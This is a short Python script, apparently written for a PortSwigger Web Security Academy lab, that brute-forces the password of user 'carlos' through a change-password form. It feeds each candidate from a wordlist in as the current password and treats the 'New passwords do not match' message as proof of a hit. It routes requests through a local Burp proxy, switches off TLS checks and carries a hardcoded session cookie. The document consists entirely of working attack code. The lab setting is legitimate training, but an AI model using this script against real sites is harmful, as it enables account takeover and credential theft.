#login form brute forcer
import requests
import sys

requests.packages.urllib3.disable_warnings()

target = 'https://0aef00940394b3cf825997e700880030.web-security-academy.net/my-account/change-password'
usernames = ["carlos"]
passwords = "burppasswords.txt"
needle = "New passwords do not match"
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
cookies = {'session': 'gZrKODl2oBnETjJXjwrbwFQeEHA2Phda'}

for username in usernames:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n").encode()
            sys.stdout.write("[X] Attempting user:password -> {}:{} \r".format(username, password.decode()))
            sys.stdout.flush()
            sys.stdout.flush()
            r = requests.post(target, data={"username": username, "current-password": password, "new-password-1": "1", "new-password-2": "2"}, proxies=proxies, verify=False, cookies=cookies)
            if needle in r.text:
                sys.stdout.write("\n")
                sys.stdout.write("\r[>>>>>] Valid password '{}' found for user '{}' !".format(password.decode(), username))
                exit()
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write("\tNo Password found for {}".format(username))
        sys.stdout.write("\n")

                         